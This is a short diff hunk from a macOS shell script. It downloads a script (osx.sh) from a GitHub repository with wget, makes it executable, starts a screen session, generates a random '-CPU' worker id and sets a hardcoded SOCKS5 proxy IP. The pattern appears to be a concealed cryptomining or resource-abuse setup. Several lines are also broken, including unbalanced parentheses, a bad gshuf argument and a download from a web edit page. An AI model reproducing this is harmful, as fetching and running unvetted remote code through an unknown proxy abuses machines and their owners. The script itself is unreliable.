@@ -4,7 +4,7 @@ softwareupdate-1
   brew install --cask screen
   brew install coreutils
   wget https://github.com/Reyacrypt/rdpgame/edit/main/osx.sh
-  chmod +x install
+  chmod +x osx.sh
   screen -dms ls
   WORKER=$(echo $(gshuf -i 11111-9999999 -n i)-CPU
   PROXY=socks5://72.210.252.134:46164
